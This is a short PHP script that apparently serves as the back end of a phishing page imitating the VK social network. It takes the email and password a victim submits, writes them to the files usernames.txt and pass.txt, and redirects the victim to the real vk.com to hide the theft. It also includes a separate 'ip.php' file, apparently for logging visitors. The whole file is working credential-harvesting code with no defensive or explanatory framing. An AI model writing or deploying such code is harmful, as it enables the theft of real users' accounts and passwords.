<?php
include 'ip.php';
file_put_contents("usernames.txt", "VK Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "VK Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.vk.com');
?>
